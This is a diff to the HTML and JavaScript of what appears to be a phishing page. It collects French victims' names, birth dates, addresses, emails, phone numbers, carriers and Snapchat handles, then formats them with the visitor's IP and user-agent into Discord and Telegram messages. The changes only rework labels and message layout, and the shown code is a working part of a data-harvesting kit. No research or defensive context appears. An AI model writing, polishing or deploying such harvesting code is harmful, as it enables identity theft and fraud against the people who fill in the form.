@@ -56,6 +56,12 @@
       color: #f88;
       margin-top: 15px;
     }
+    label {
+      display: block;
+      text-align: left;
+      margin: 10px 0 5px 0;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
@@ -64,7 +70,10 @@
     <form id="form2">
       <input name="nom" placeholder="Nom" required>
       <input name="prenom" placeholder="Prénom" required>
-      <input name="naissance" type="date" placeholder="Date de naissance" required>
+
+      <label for="naissance">📅 Date de naissance :</label>
+      <input id="naissance" name="naissance" type="date" required>
+
       <input name="email" type="email" placeholder="Email" required>
       <input name="ville" placeholder="Ville" required>
       <input name="codePostal" placeholder="Code Postal" required>
@@ -122,48 +131,45 @@
       const ua = step1.ua || "Inconnu";
 
       const discordEmbed = {
-        title: "🍭 +1 Entrée  🍭",
+        title: "[☎️] + new [☎️]",
         color: 0x9B00FF,
         fields: [
           {
             name: "\u200B",
             value:
-              `🍬 Nom         : ${step2.nom}\n` +
-              `🍬 Prénom      : ${step2.prenom}\n` +
-              `🍬 Naissance   : ${step2.naissance || 'Non fournie'}\n` +
-              `🍬 Snapchat    : ${step2.snap || 'Non fourni'}\n\n` +
-
-              `┣🏠 Adresse     : ${step2.adresse || 'Non fournie'}\n` +
-              `┣🏠 Ville       : ${step2.ville}\n` +
-              `┗🏠 Code Postal : ${step2.codePostal}\n\n` +
-
-              `📧 Email       : ${step2.email}\n` +
-              `📞 Téléphone   : ${step1.telephone || 'Non fourni'}\n` +
-              `📶 Opérateur   : ${step1.operateur || 'Non fourni'}\n\n` +
-
-              `📟 IP          : ${ip}\n` +
-              `🔎 User-Agent  : ${ua}`
+              `[🎲] INFOS [🎲]\n\n` +
+              `🚀 Nom             : ${step2.nom}\n` +
+              `🚀 Prénom          : ${step2.prenom}\n` +
+              `🎂 Naissance       : ${step2.naissance}\n` +
+              `🚀 Adresse         : ${step2.adresse || 'Non fournie'}\n` +
+              `🚀 Ville           : ${step2.ville}\n` +
+              `🚀 Code Postal     : ${step2.codePostal}\n` +
+              `📧 E‑Mail          : ${step2.email}\n` +
+              `👻 Snapchat        : ${step2.snap}\n\n` +
+              `[📞] Phone [📞]\n` +
+              `📡 Opérateur       : ${step1.operateur || 'Non fourni'}\n` +
+              `📱 Téléphone       : ${step1.telephone || 'Non fourni'}\n\n` +
+              `[🌐] TIERS [🌐]\n` +
+              `📟 Adresse IP      : ${ip}\n` +
+              `🔎 User-Agent      : ${ua}`
           }
         ],
-        timestamp: new Date().toISOString(),
-        footer: {
-          text: "📥 Données reçues via le formulaire"
-        }
+        timestamp: new Date().toISOString()
       };
 
       const telegramText =
         `[🎲] INFOS [🎲]\n\n` +
         `🚀 Nom : ${step2.nom}\n` +
         `🚀 Prénom : ${step2.prenom}\n` +
-        `🚀 Naissance : ${step2.naissance || 'Non fournie'}\n` +
+        `🎂 Naissance : ${step2.naissance}\n` +
         `🚀 Adresse : ${step2.adresse || 'Non fournie'}\n` +
         `🚀 Ville : ${step2.ville}\n` +
         `🚀 Code Postal : ${step2.codePostal}\n` +
-        `🚀 E‑Mail : ${step2.email}\n` +
-        `🚀 Snapchat : ${step2.snap}\n\n` +
+        `📧 E‑Mail : ${step2.email}\n` +
+        `👻 Snapchat : ${step2.snap}\n\n` +
         `[📞] Phone [📞]\n` +
-        `📶 Opérateur : ${step1.operateur || 'Non fourni'}\n` +
-        `📞 Téléphone : ${step1.telephone || 'Non fourni'}\n\n` +
+        `📡 Opérateur : ${step1.operateur || 'Non fourni'}\n` +
+        `📱 Téléphone : ${step1.telephone || 'Non fourni'}\n\n` +
         `[🌐] TIERS [🌐]\n` +
         `📟 Adresse IP : ${ip}\n` +
         `🔎 User-Agent : ${ua}`;
